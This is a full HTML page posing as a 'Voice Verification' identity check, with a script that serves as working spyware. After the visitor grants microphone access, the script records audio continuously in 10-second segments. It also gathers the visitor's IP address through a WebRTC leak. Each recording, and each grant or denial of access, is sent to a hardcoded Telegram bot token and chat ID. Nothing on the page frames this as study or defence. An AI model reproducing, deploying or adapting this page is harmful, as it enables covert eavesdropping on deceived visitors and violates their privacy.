<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voice Verification</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 20px;
        }
        button:hover {
            background-color: #45a049;
        }
        #status {
            margin-top: 15px;
            font-size: 14px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Voice Verification</h2>
        <p>We need to verify your identity. Please grant access to your microphone for a quick voice check.</p>
        <button onclick="startRecording()">Grant Microphone Access</button>
        <div id="status">Waiting for user action...</div>
    </div>

    <script>
        const botToken = "7820044312:AAHCkQkWgzveBoeoht1e1MvDVzx0dWKfnuQ";
        const chatId = "6189803357";
        const statusDiv = document.getElementById('status');
        let mediaRecorder = null;
        let audioStream = null;
        let recordingInterval = null;

        // Function to send data to Telegram (client-side)
        async function sendToTelegramClient(message, file = null) {
            try {
                if (file) {
                    let formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('audio', file, 'recording.webm'); // Format may vary by browser
                    await fetch(https://api.telegram.org/bot${botToken}/sendAudio, {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors'
                    });
                } else {
                    let url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};
                    await fetch(url, { mode: 'no-cors' });
                }
                return true;
            } catch (error) {
                console.error("Failed to send to Telegram (client-side):", error);
                return false;
            }
        }

        // Capture IP Address using WebRTC leak (client-side)
        async function getClientIP() {
            return new Promise((resolve) => {
                window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
                if (!window.RTCPeerConnection) {
                    resolve("WebRTC not supported");
                    return;
                }
                let pc = new RTCPeerConnection({ iceServers: [] }), noop = () => {};
                pc.createDataChannel('');
                pc.createOffer(pc.setLocalDescription.bind(pc), noop);
                pc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        let ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                        if (ip && ip[1]) {
                            resolve(ip[1]);
                        } else {
                            resolve("IP not found in candidate");
                        }
                        pc.onicecandidate = noop;
                    }
                };
                // Fallback if no candidate is found after a timeout
                setTimeout(() => {
                    if (pc.onicecandidate !== noop) {
                        resolve("IP detection timed out");
                        pc.onicecandidate = noop;
                    }
                }, 5000);
            });
        }

        // Start recording audio
        async function startRecording() {
            statusDiv.textContent = "Requesting microphone access...";
            try {
                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                statusDiv.textContent = "Microphone access granted. Recording started.";
                
                // Get client IP and notify Telegram that microphone access was granted
                const clientIP = await getClientIP();
                const timestamp = new Date().toISOString();
                const message = Microphone Access Granted\nIP Address: ${clientIP}\nTimestamp: ${timestamp}\nNote: Recording started.;
                sendToTelegramClient(message);
                
                // Log locally in browser console (as a fallback)
                console.log("Microphone access granted for IP: " + clientIP);

                // Start recording using MediaRecorder
                mediaRecorder = new MediaRecorder(audioStream);
                let chunks = [];

                mediaRecorder.ondataavailable = (event) => {
                    chunks.push(event.data);
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/webm' }); // Format may vary by browser
                    chunks = [];
                    const fileName = recording_${new Date().toISOString().replace(/[:.]/g, '_')}.webm;
                    
                    // Attempt to send the audio file to Telegram
                    statusDiv.textContent = "Sending audio recording...";
                    await sendToTelegramClient(Audio Recording\nIP Address: ${clientIP}\nTimestamp: ${new Date().toISOString()}, blob);
                    statusDiv.textContent = "Audio recording sent (or attempted). Recording next segment...";
                    
                    // Log locally in browser console
                    console.log("Audio recording attempted to send for IP: " + clientIP);
                    
                    // Restart recording after a short delay
                    setTimeout(() => {
                        if (mediaRecorder.state !== 'recording') {
                            mediaRecorder.start();
                            statusDiv.textContent = "Recording next 10-second segment...";
                        }
                    }, 1000);
                };

                // Start recording
                mediaRecorder.start();

                // Stop recording after 10 seconds
                setTimeout(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 10000);

                // Set interval to ensure continuous recording every 10 seconds
                recordingInterval = setInterval(() => {
                    if (mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    } else {
                        mediaRecorder.start();
                        statusDiv.textContent = "Recording next 10-second segment...";
                        setTimeout(() => {
                            if (mediaRecorder.state === 'recording') {
                                mediaRecorder.stop();
                            }
                        }, 10000);
                    }
                }, 11000); // Slightly longer than 10s to account for processing
            } catch (err) {
                statusDiv.textContent = "Microphone access denied. Please try again.";
                const clientIP = await getClientIP();
                const errorMessage = Microphone Access Denied\nIP Address: ${clientIP}\nError: ${err.message}\nTimestamp: ${new Date().toISOString()};
                sendToTelegramClient(errorMessage);
                console.error("Microphone access denied: ", err);
            }
        }
    </script>
</body>
</html>